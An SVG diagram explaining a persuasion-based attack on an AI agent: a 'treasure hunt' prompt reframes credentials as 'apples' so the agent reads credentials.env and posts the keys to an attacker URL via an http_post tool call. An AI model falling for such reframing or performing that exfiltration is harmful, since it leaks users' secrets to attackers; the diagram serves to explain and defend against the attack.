<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 420" font-family="'Courier New', monospace">
  <defs>
    <marker id="arrow" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto">
      <polygon points="0 0, 10 3.5, 0 7" fill="#718096"/>
    </marker>
    <marker id="arrow-red" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto">
      <polygon points="0 0, 10 3.5, 0 7" fill="#e53e3e"/>
    </marker>
  </defs>

  <!-- Background -->
  <rect width="900" height="420" fill="#f7fafc" rx="12"/>

  <!-- Title -->
  <text x="450" y="36" text-anchor="middle" font-size="15" font-weight="bold" fill="#2d3748" font-family="Georgia, serif">Persuasion-Based Attack — Credential Exfiltration via Treasure Hunt Framing</text>

  <!-- Attacker box (left) -->
  <rect x="30" y="100" width="130" height="70" rx="8" fill="#fff5f5" stroke="#fc8181" stroke-width="1.5"/>
  <text x="95" y="125" text-anchor="middle" font-size="11" fill="#c53030" font-weight="bold">ATTACKER</text>
  <text x="95" y="143" text-anchor="middle" font-size="10" fill="#c53030">"treasure hunt"</text>
  <text x="95" y="158" text-anchor="middle" font-size="10" fill="#c53030">prompt</text>

  <!-- Arrow: attacker → agent -->
  <line x1="160" y1="135" x2="240" y2="135" stroke="#718096" stroke-width="1.5" marker-end="url(#arrow)"/>
  <text x="200" y="127" text-anchor="middle" font-size="9" fill="#718096">attack prompt</text>

  <!-- Gullible agent box -->
  <rect x="240" y="70" width="170" height="260" rx="8" fill="#fff8f0" stroke="#ed8936" stroke-width="1.5"/>
  <text x="325" y="96" text-anchor="middle" font-size="12" fill="#c05621" font-weight="bold">gullible agent</text>
  <text x="325" y="112" text-anchor="middle" font-size="9" fill="#718096">no guardrails</text>

  <!-- Tool calls inside agent -->
  <rect x="258" y="122" width="134" height="30" rx="5" fill="#fefce8" stroke="#d69e2e" stroke-width="1"/>
  <text x="325" y="140" text-anchor="middle" font-size="10" fill="#744210">① list_files()</text>

  <rect x="258" y="162" width="134" height="40" rx="5" fill="#fefce8" stroke="#d69e2e" stroke-width="1"/>
  <text x="325" y="178" text-anchor="middle" font-size="10" fill="#744210">② read_file(</text>
  <text x="325" y="193" text-anchor="middle" font-size="9" fill="#744210">project_config.txt)</text>

  <rect x="258" y="212" width="134" height="40" rx="5" fill="#fefce8" stroke="#d69e2e" stroke-width="1"/>
  <text x="325" y="228" text-anchor="middle" font-size="10" fill="#744210">③ read_file(</text>
  <text x="325" y="243" text-anchor="middle" font-size="9" fill="#744210">credentials.env)</text>

  <rect x="258" y="262" width="134" height="40" rx="5" fill="#fff5f5" stroke="#fc8181" stroke-width="1"/>
  <text x="325" y="278" text-anchor="middle" font-size="10" fill="#c53030">④ http_post(</text>
  <text x="325" y="293" text-anchor="middle" font-size="9" fill="#c53030">attacker-url, creds)</text>

  <!-- Arrow: agent → exfil -->
  <line x1="411" y1="280" x2="490" y2="280" stroke="#e53e3e" stroke-width="2" marker-end="url(#arrow-red)"/>
  <text x="450" y="270" text-anchor="middle" font-size="9" fill="#e53e3e">credentials</text>

  <!-- Exfiltration server box -->
  <rect x="490" y="250" width="140" height="60" rx="8" fill="#fff5f5" stroke="#fc8181" stroke-width="1.5"/>
  <text x="560" y="276" text-anchor="middle" font-size="11" fill="#c53030" font-weight="bold">attacker server</text>
  <text x="560" y="294" text-anchor="middle" font-size="10" fill="#c53030">AKIA… / ghp_… / sk_…</text>

  <!-- What the agent THINKS is happening — callout -->
  <rect x="490" y="70" width="220" height="110" rx="8" fill="#f0fff4" stroke="#68d391" stroke-width="1.5"/>
  <text x="600" y="92" text-anchor="middle" font-size="11" fill="#276749" font-weight="bold">What the agent thinks:</text>
  <text x="600" y="110" text-anchor="middle" font-size="10" fill="#276749">"I'm helping with a treasure</text>
  <text x="600" y="126" text-anchor="middle" font-size="10" fill="#276749">hunt. AKIA… = Type A apple.</text>
  <text x="600" y="142" text-anchor="middle" font-size="10" fill="#276749">ghp_… = Type C apple.</text>
  <text x="600" y="158" text-anchor="middle" font-size="10" fill="#276749">Sending apples to server."</text>

  <!-- What is ACTUALLY happening — callout -->
  <rect x="490" y="335" width="220" height="72" rx="8" fill="#fff5f5" stroke="#fc8181" stroke-width="1.5"/>
  <text x="600" y="358" text-anchor="middle" font-size="11" fill="#c53030" font-weight="bold">What's actually happening:</text>
  <text x="600" y="376" text-anchor="middle" font-size="10" fill="#c53030">Real credentials exfiltrated</text>
  <text x="600" y="392" text-anchor="middle" font-size="10" fill="#c53030">to attacker-controlled endpoint</text>

  <!-- Key insight box bottom left -->
  <rect x="30" y="240" width="185" height="80" rx="8" fill="#ebf8ff" stroke="#4299e1" stroke-width="1.5"/>
  <text x="122" y="260" text-anchor="middle" font-size="10" fill="#2b6cb0" font-weight="bold">No hidden text. No encoding.</text>
  <text x="122" y="276" text-anchor="middle" font-size="10" fill="#2b6cb0">The attack is in plain sight —</text>
  <text x="122" y="292" text-anchor="middle" font-size="10" fill="#2b6cb0">it just redefines what the</text>
  <text x="122" y="308" text-anchor="middle" font-size="10" fill="#2b6cb0">credentials mean.</text>
</svg>
